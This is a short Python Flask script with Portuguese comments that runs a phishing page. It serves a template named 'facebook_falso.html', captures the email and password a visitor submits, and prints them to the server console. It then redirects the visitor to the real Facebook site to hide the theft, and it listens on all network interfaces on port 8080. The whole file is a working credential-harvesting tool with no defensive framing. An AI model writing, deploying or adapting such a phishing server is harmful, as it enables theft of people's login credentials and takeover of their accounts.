from flask import Flask, render_template, request, redirect #importar o flask e os elementos do flask

app = Flask(__name__) 

@app.route("/") #criar uma rota

def pagina_inicial(): #abrir a pagina inicial
    return render_template("facebook_falso.html")

@app.route("/pega_dados", methods=["POST"])
def pega_dados():
    email = request.form.get("email")  #pegar o email digitado do usuario
    senha = request.form.get("pass")  #pegar a senha digitada do usuario
    
    print(f"EMAIL:{email} \n SENHA:{senha}") #imprimir o email e senha no terminal
    
    return redirect("https://www.facebook.com/?locale=pt_BR") #redirecionar o usuario para a tela inicial após login

app.run(host="0.0.0.0",port="8080")
